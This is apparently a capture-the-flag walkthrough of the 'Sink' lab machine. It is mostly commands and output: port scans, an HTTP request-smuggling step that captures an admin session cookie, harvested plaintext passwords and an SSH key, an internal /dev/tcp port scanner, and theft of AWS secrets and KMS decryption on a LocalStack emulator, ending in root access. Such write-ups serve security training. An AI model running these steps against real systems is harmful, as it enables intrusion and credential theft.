$ nmap --min-rate 3000 -oN nmap-tcp.initial -p- -Pn -T4 -v 10.10.10.225

$ nmap -oN nmap-tcp -p 22,3000,5000 -sC -sV -v 10.10.10.225

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=40763612537a2fd4; Path=/; HttpOnly
|     Set-Cookie: _csrf=sSdj6NIEq9zZwLKWHIf2zioCJzQ6MTYxODA3MjI5ODUxMDE3ODY1NA; Path=/; Expires=Sun, 11 Apr 2021 16:31:38 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 10 Apr 2021 16:31:38 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=009014c3b2d4e2d9; Path=/; HttpOnly
|     Set-Cookie: _csrf=fe5c5svRDDMllearHCwpoZFZJds6MTYxODA3MjMwNDQyMjM4NDk1MQ; Path=/; Expires=Sun, 11 Apr 2021 16:31:44 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 10 Apr 2021 16:31:44 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|_    <meta name="description" content="Gitea (Git with a c
5000/tcp open  http    Gunicorn 20.0.0
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: gunicorn/20.0.0
|_http-title: Sink Devops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

$ gobuster dir -o 5000_gobuster.txt -u http://10.10.10.225:5000 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,zip

---


ggwp GET /notes/delete/1234 HTTP/1.1 Host: 127.0.0.1:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept-Encoding: gzip, deflate Accept: */* Cookie: session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.YHIPVw.qDEraV1rYVUbYx0EGcPO9vG7-jc X-Forwarded-For: 127.0.0.1 


http://10.10.10.225:5000/notes/1
Chef Login : http://chef.sink.htb Username : chefadm Password : /6'fEGC&zEx{4]zz

http://10.10.10.225:5000/notes/2
Dev Node URL : http://code.sink.htb Username : root Password : FaH@3L>Z3})zzfQ3

http://10.10.10.225:5000/notes/3
Nagios URL : https://nagios.sink.htb Username : nagios_adm Password : g8<H6GK\{*L.fB3C

---
  marcus 	b01a6b7ed3 	Adding EC2 Key Management Structure 	4 months ago
http://10.10.10.225:3000/root/Key_Management/commit/b01a6b7ed372d154ed0bc43a342a5e1203d07b1e

$ ssh -l marcus -i ~/Desktop/sink.id_rsa 10.10.10.225

marcus@sink:~$ id

  uid=1001(marcus) gid=1001(marcus) groups=1001(marcus)

marcus@sink:~$ uname -a

  Linux sink 5.4.0-53-generic #59-Ubuntu SMP Wed Oct 21 09:38:44 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

marcus@sink:~$ ls -l
  
  total 4
  -r-------- 1 marcus marcus 33 Apr 10 20:49 user.txt

---

root        1515  0.0  2.3 1557756 93800 ?       Ssl  Apr10   0:21 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        2325  0.0  0.1 549912  7100 ?        Sl   Apr10   0:03  \_ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 4566 -container-ip 172.18.0.2 -container-port 4566
root        2350  0.0  0.0 475924  2856 ?        Sl   Apr10   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6014 -container-ip 172.17.0.2 -container-port 8080
root        2377  0.0  0.0 474516  2976 ?        Sl   Apr10   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6003 -container-ip 172.17.0.3 -container-port 8080
root        2394  0.0  0.0 474516  2944 ?        Sl   Apr10   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6004 -container-ip 172.17.0.4 -container-port 8080
root        2416  0.0  0.0 548248  2912 ?        Sl   Apr10   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6000 -container-ip 172.17.0.5 -container-port 8080
root        2483  0.0  0.0 400784  2936 ?        Sl   Apr10   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6011 -container-ip 172.17.0.6 -container-port 8080
root        2613  0.0  0.0 400784  3052 ?        Sl   Apr10   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6010 -container-ip 172.17.0.7 -container-port 8080
root        2634  0.0  0.0 400784  3040 ?        Sl   Apr10   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6002 -container-ip 172.17.0.8 -container-port 8080
root        2670  0.0  0.0 474516  2952 ?        Sl   Apr10   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6013 -container-ip 172.17.0.9 -container-port 8080
root        2726  0.0  0.0 474516  2952 ?        Sl   Apr10   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6008 -container-ip 172.17.0.10 -container-port 8080
root        2771  0.0  0.0 474516  2936 ?        Sl   Apr10   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6005 -container-ip 172.17.0.11 -container-port 8080
root        2810  0.0  0.0 400784  3004 ?        Sl   Apr10   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6009 -container-ip 172.17.0.12 -container-port 8080
root        2851  0.0  0.0 474516  2936 ?        Sl   Apr10   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6007 -container-ip 172.17.0.13 -container-port 8080
root        2947  0.0  0.0 400784  2956 ?        Sl   Apr10   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6012 -container-ip 172.17.0.14 -container-port 8080
root        3006  0.0  0.0 474516  2924 ?        Sl   Apr10   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6001 -container-ip 172.17.0.15 -container-port 8080
root        3050  0.0  0.0 621980  2992 ?        Sl   Apr10   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6015 -container-ip 172.17.0.16 -container-port 8080
root        3093  0.0  0.0 400784  3036 ?        Sl   Apr10   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6006 -container-ip 172.17.0.17 -container-port 8080

marcus@sink:/var/log/gunicorn$ for i in {1..254} ;do (ping -c 1 172.17.0.$i | grep "bytes from" &) ;done
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.175 ms
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.085 ms
64 bytes from 172.17.0.4: icmp_seq=1 ttl=64 time=0.132 ms
64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.236 ms
64 bytes from 172.17.0.5: icmp_seq=1 ttl=64 time=0.512 ms
64 bytes from 172.17.0.6: icmp_seq=1 ttl=64 time=0.081 ms
64 bytes from 172.17.0.7: icmp_seq=1 ttl=64 time=0.127 ms
64 bytes from 172.17.0.8: icmp_seq=1 ttl=64 time=0.110 ms
64 bytes from 172.17.0.9: icmp_seq=1 ttl=64 time=0.053 ms
64 bytes from 172.17.0.10: icmp_seq=1 ttl=64 time=0.054 ms
64 bytes from 172.17.0.11: icmp_seq=1 ttl=64 time=0.144 ms
64 bytes from 172.17.0.13: icmp_seq=1 ttl=64 time=0.044 ms
64 bytes from 172.17.0.12: icmp_seq=1 ttl=64 time=0.124 ms
64 bytes from 172.17.0.14: icmp_seq=1 ttl=64 time=0.087 ms
64 bytes from 172.17.0.15: icmp_seq=1 ttl=64 time=0.029 ms
64 bytes from 172.17.0.16: icmp_seq=1 ttl=64 time=0.185 ms
64 bytes from 172.17.0.17: icmp_seq=1 ttl=64 time=0.093 ms

#!/bin/bash
for octet in {2..17}; do
    echo 172.17.0.$octet;
    for port in {1..12000}; do
        (echo > /dev/tcp/$1/$port) &>/dev/null
        [ $? -eq 0 ] && echo "TCP PORT $port open"
    done;
done;

172.17.0.2
TCP PORT 8080 open
172.17.0.3
TCP PORT 8080 open
172.17.0.4
TCP PORT 8080 open
172.17.0.5
TCP PORT 8080 open
172.17.0.6
TCP PORT 8080 open
172.17.0.7
TCP PORT 8080 open
172.17.0.8
TCP PORT 8080 open
172.17.0.9
TCP PORT 8080 open
172.17.0.10
TCP PORT 8080 open
172.17.0.11
TCP PORT 8080 open
172.17.0.12
TCP PORT 8080 open
172.17.0.13
TCP PORT 8080 open
172.17.0.14
TCP PORT 8080 open
172.17.0.15
TCP PORT 8080 open
172.17.0.16
TCP PORT 8080 open
172.17.0.17
TCP PORT 8080 open

---

$ curl http://127.0.0.1:4566/health | jq

marcus@sink:/dev$ aws configure
AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key [None]: 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
Default region name [None]: eu
Default output format [None]: 

marcus@sink:/dev$ aws logs describe-log-groups --endpoint-url http://127.0.0.1:4566
{
    "logGroups": [
        {
            "logGroupName": "cloudtrail",
            "creationTime": 1618147861807,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:us-east-1:000000000000:log-group:cloudtrail",
            "storedBytes": 91
        }
    ]
}

marcus@sink:/dev$ aws logs describe-log-streams --log-group-name cloudtrail --endpoint-url http://127.0.0.1:4566
{
    "logStreams": [
        {
            "logStreamName": "20201222",
            "creationTime": 1618147981281,
            "firstEventTimestamp": 1126190184356,
            "lastEventTimestamp": 1533190184356,
            "lastIngestionTime": 1618147981313,
            "uploadSequenceToken": "1",
            "arn": "arn:aws:logs:us-east-1:1003:log-group:cloudtrail:log-stream:20201222",
            "storedBytes": 91
        }
    ]
}

marcus@sink:/dev$ aws logs get-log-events --log-group-name cloudtrail --log-stream-name 20201222 --endpoint-url http://127.0.0.1:4566
{
    "events": [
        {
            "timestamp": 1126190184356,
            "message": "RotateSecret",
            "ingestionTime": 1618148161918
        },
        {
            "timestamp": 1244190184360,
            "message": "TagResource",
            "ingestionTime": 1618148161918
        },
        {
            "timestamp": 1412190184358,
            "message": "PutResourcePolicy",
            "ingestionTime": 1618148161918
        },
        {
            "timestamp": 1433190184356,
            "message": "AssumeRole",
            "ingestionTime": 1618148161918
        },
        {
            "timestamp": 1433190184358,
            "message": "PutScalingPolicy",
            "ingestionTime": 1618148161918
        },
        {
            "timestamp": 1433190184360,
            "message": "RotateSecret",
            "ingestionTime": 1618148161918
        },
        {
            "timestamp": 1533190184356,
            "message": "RestoreSecret",
            "ingestionTime": 1618148161918
        }
    ],
    "nextForwardToken": "f/00000000000000000000000000000000000000000000000000000006",
    "nextBackwardToken": "b/00000000000000000000000000000000000000000000000000000000"
}


---

    <?php
    require 'vendor/autoload.php';

    use Aws\CloudWatchLogs\CloudWatchLogsClient;
    use Aws\Exception\AwsException;

    $client = new CloudWatchLogsClient([
    	'region' => 'eu',
    	'endpoint' => 'http://127.0.0.1:4566',
    	'credentials' => [
    		'key' => '<ACCESS_KEY_ID>',
    		'secret' => '<SECRET_KEY>'
    	],
    	'version' => 'latest'
    ]);
    try {
    $client->createLogGroup(array(
    	'logGroupName' => 'Chef_Events',
    ));
    }
    catch (AwsException $e) {
        echo $e->getMessage();
        echo "\n";
    }
    try {
    $client->createLogStream([
    	'logGroupName' => 'Chef_Events',
    	'logStreamName' => '20201120'
    ]);
    }catch (AwsException $e) {
        echo $e->getMessage();
        echo "\n";
    }
    ?>
---

$ aws secretsmanager list-secrets --endpoint-url http://127.0.0.1:4566
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-cPCXi",
            "Name": "Jenkins Login",
            "Description": "Master Server to manage release cycle 1",
            "KmsKeyId": "",
            "RotationEnabled": false,
            "RotationLambdaARN": "",
            "RotationRules": {
                "AutomaticallyAfterDays": 0
            },
            "Tags": [],
            "SecretVersionsToStages": {
                "76fdb5fb-fb3b-414a-a028-7324634a3a01": [
                    "AWSCURRENT"
                ]
            }
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-MZKWb",
            "Name": "Sink Panel",
            "Description": "A panel to manage the resources in the devnode",
            "KmsKeyId": "",
            "RotationEnabled": false,
            "RotationLambdaARN": "",
            "RotationRules": {
                "AutomaticallyAfterDays": 0
            },
            "Tags": [],
            "SecretVersionsToStages": {
                "42b95550-90c5-4686-a517-6e5d67b5d8a5": [
                    "AWSCURRENT"
                ]
            }
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-DoSpK",
            "Name": "Jira Support",
            "Description": "Manage customer issues",
            "KmsKeyId": "",
            "RotationEnabled": false,
            "RotationLambdaARN": "",
            "RotationRules": {
                "AutomaticallyAfterDays": 0
            },
            "Tags": [],
            "SecretVersionsToStages": {
                "7c8eadc2-97c3-44b7-8b0c-a81cdddf4003": [
                    "AWSCURRENT"
                ]
            }
        }
    ]
}

$ aws secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-cPCXi" --endpoint-url http://127.0.0.1:4566
{
    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-cPCXi",
    "Name": "Jenkins Login",
    "VersionId": "76fdb5fb-fb3b-414a-a028-7324634a3a01",
    "SecretString": "{\"username\":\"john@sink.htb\",\"password\":\"R);\\)ShS99mZ~8j\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2021-04-10T16:50:10-04:00"
}
$ aws secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-MZKWb" --endpoint-url http://127.0.0.1:4566
{
    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-MZKWb",
    "Name": "Sink Panel",
    "VersionId": "42b95550-90c5-4686-a517-6e5d67b5d8a5",
    "SecretString": "{\"username\":\"albert@sink.htb\",\"password\":\"Welcome123!\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2021-04-10T16:50:10-04:00"
}
$ aws secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-DoSpK" --endpoint-url http://127.0.0.1:4566
{
    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-DoSpK",
    "Name": "Jira Support",
    "VersionId": "7c8eadc2-97c3-44b7-8b0c-a81cdddf4003",
    "SecretString": "{\"username\":\"david@sink.htb\",\"password\":\"EALB=bcC=`a7f2#k\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2021-04-10T16:50:10-04:00"
}

---

---

david@sink:~/Projects/Prod_Deployment$ echo $(cat servers.enc | xxd -p | tr -d '\n')
99732cfbc64b129f64ac62cb253d981cb80740ffee4496127d7f984ea6abef069bbce43c3d2b8fc14140984261f3aab791a5119a7471affb2666f914e8fa7428f57bc9edac3f5d21bcf2431769a435c2045627f745a314d3c8d98bb53f821672a17b1e33a10472ef5cd606290ea67be0230487b0286ac92c2ecc022496582344df72f4e55f1f385c17c25ac2bb713c836f84ae82102af4c63cf50ea5b7b827c3a2301bfb521e2f5ad4c63c79b942c0230dc11ac5438e31f29de14b614bc597b688a52ba62c940e67538691493dc337bb189753e72ec99260c734365a5d06a9a8f4469543db0db0246ad00670a7a2e6a1383d525d3dc3c2b50c597c9e34c739da55a8dda07e9aafee84bc5c4de1922261c971f518610a97a08ace1dc4bb3b5585a1a32f32d20097eb91b25195484c2253ab157bd9cc0aecafaec6ec434378ea38eba398759c5993999d02d57afdec6a3fa47989c601b59719ce7a9b2094bacf31773917a9451f568ac65cc5540c46296340cd3973182f879c15e3ba02e93fc4a1a5bdb81cf767b7f7c5fdd75af2ac9a31c61908e98b383ba6b36f913adacf278093b9a8926ce589ba1790e94fefe406de41217ddd1176f22ca203dd394823518b77a31831fae4e5afe9ac355674dff1369110f1f964d2dacd35b9268f24bcba89684b5921244d5049ac247afbf54d558e9a2f3f378f4ca7834d1d2aa2c5bf189f


$ aws kms list-keys --endpoint-url http://127.0.0.1:4566                                                     252 ⨯
{
    "Keys": [
        {
            "KeyId": "0b539917-5eff-45b2-9fa1-e13f0d2c42ac",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/0b539917-5eff-45b2-9fa1-e13f0d2c42ac"
        },
        {
            "KeyId": "16754494-4333-4f77-ad4c-d0b73d799939",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/16754494-4333-4f77-ad4c-d0b73d799939"
        },
        {
            "KeyId": "2378914f-ea22-47af-8b0c-8252ef09cd5f",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/2378914f-ea22-47af-8b0c-8252ef09cd5f"
        },
        {
            "KeyId": "2bf9c582-eed7-482f-bfb6-2e4e7eb88b78",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/2bf9c582-eed7-482f-bfb6-2e4e7eb88b78"
        },
        {
            "KeyId": "53bb45ef-bf96-47b2-a423-74d9b89a297a",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/53bb45ef-bf96-47b2-a423-74d9b89a297a"
        },
        {
            "KeyId": "804125db-bdf1-465a-a058-07fc87c0fad0",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0"
        },
        {
            "KeyId": "837a2f6e-e64c-45bc-a7aa-efa56a550401",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/837a2f6e-e64c-45bc-a7aa-efa56a550401"
        },
        {
            "KeyId": "881df7e3-fb6f-4c7b-9195-7f210e79e525",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/881df7e3-fb6f-4c7b-9195-7f210e79e525"
        },
        {
            "KeyId": "c5217c17-5675-42f7-a6ec-b5aa9b9dbbde",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/c5217c17-5675-42f7-a6ec-b5aa9b9dbbde"
        },
        {
            "KeyId": "f0579746-10c3-4fd1-b2ab-f312a5a0f3fc",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/f0579746-10c3-4fd1-b2ab-f312a5a0f3fc"
        },
        {
            "KeyId": "f2358fef-e813-4c59-87c8-70e50f6d4f70",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/f2358fef-e813-4c59-87c8-70e50f6d4f70"
        }
    ]
}

$ aws kms list-keys --endpoint-url http://127.0.0.1:4566 | jq -r '.Keys[].KeyId' > kms_key_id

$ for i in $(cat kms_key_id); do aws kms describe-key --key-id $i --endpoint-url http://127.0.0.1:4566 | jq -c '.KeyMetadata | {"KeyId": .KeyId, "Description": .Description, "KeyState": .KeyState, "EncryptionAlgorithms": .EncryptionAlgorithms}'; done  
{"KeyId":"0b539917-5eff-45b2-9fa1-e13f0d2c42ac","Description":"Encryption and Decryption","KeyState":"Disabled","EncryptionAlgorithms":["RSAES_OAEP_SHA_1","RSAES_OAEP_SHA_256"]}
{"KeyId":"16754494-4333-4f77-ad4c-d0b73d799939","Description":"Encryption and Decryption","KeyState":"Disabled","EncryptionAlgorithms":["RSAES_OAEP_SHA_1","RSAES_OAEP_SHA_256"]}
{"KeyId":"2378914f-ea22-47af-8b0c-8252ef09cd5f","Description":"Encryption and Decryption","KeyState":"Disabled","EncryptionAlgorithms":["RSAES_OAEP_SHA_1","RSAES_OAEP_SHA_256"]}
{"KeyId":"2bf9c582-eed7-482f-bfb6-2e4e7eb88b78","Description":"test key 123","KeyState":"Disabled","EncryptionAlgorithms":["SYMMETRIC_DEFAULT"]}
{"KeyId":"53bb45ef-bf96-47b2-a423-74d9b89a297a","Description":"Digital Signature Verification","KeyState":"Disabled","EncryptionAlgorithms":null}
{"KeyId":"804125db-bdf1-465a-a058-07fc87c0fad0","Description":"Encryption and Decryption","KeyState":"Enabled","EncryptionAlgorithms":["RSAES_OAEP_SHA_1","RSAES_OAEP_SHA_256"]}
{"KeyId":"837a2f6e-e64c-45bc-a7aa-efa56a550401","Description":"Digital Signature Verification","KeyState":"Disabled","EncryptionAlgorithms":null}
{"KeyId":"881df7e3-fb6f-4c7b-9195-7f210e79e525","Description":"Digital Signature Verification","KeyState":"Disabled","EncryptionAlgorithms":null}
{"KeyId":"c5217c17-5675-42f7-a6ec-b5aa9b9dbbde","Description":"Digital Signature Verification","KeyState":"Enabled","EncryptionAlgorithms":null}
{"KeyId":"f0579746-10c3-4fd1-b2ab-f312a5a0f3fc","Description":"Encryption and Decryption","KeyState":"Disabled","EncryptionAlgorithms":["RSAES_OAEP_SHA_1","RSAES_OAEP_SHA_256"]}
{"KeyId":"f2358fef-e813-4c59-87c8-70e50f6d4f70","Description":"Digital Signature Verification","KeyState":"Disabled","EncryptionAlgorithms":null}


$ aws kms decrypt --ciphertext-blob fileb://servers.enc --key-id "804125db-bdf1-465a-a058-07fc87c0fad0" --encryption-algorithm RSAES_OAEP_SHA_256 --endpoint-url http://127.0.0.1:4566
{
    "KeyId": "arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0",
    "Plaintext": "H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA=",
    "EncryptionAlgorithm": "RSAES_OAEP_SHA_256"
}


---

root@sink:~# id
uid=0(root) gid=0(root) groups=0(root)
root@sink:~# hostname
sink
root@sink:~# ls -l
total 20
drwxr-xr-x 4 root root 4096 Feb  1 09:43 automation
drwxr-xr-x 6 root root 4096 Jan 27 11:04 desync
-rw-r--r-- 1 root root  400 Dec  1 13:16 docker-compose.yml
-r-------- 1 root root   33 Apr 10 20:49 root.txt
drwxr-xr-x 3 root root 4096 May 18  2020 snap
root@sink:~# 

---



https://portswigger.net/web-security/request-smuggling
https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
https://nathandavison.com/blog/haproxy-http-request-smuggling
https://portswigger.net/web-security/request-smuggling/exploiting
https://blog.shoebpatel.com/2020/05/18/DefCon-CTF-2020-HTTP-Desync-between-HAProxy-Gunicorn/
https://docs.aws.amazon.com/cli/latest/reference/kms/decrypt.html